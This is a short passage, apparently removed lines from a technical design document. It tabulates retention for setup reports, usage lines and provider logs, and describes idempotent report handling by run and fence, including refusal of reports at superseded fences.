-| Pending setup report | Supervisor worker | Retained only in memory. Process loss discards it. |
-| Usage lines | Billing domain | Content-free; retained independently of the draft. |
-| Provider logs and infrastructure snapshots | Their service owners | Follow their own retention; draft deletion cannot promise physical removal from these systems. |
-
-A report is idempotent by run and fence. A replayed report finds the run settled and writes nothing. A report at a superseded fence is refused and writes nothing; the dead run's last slice is not billed.
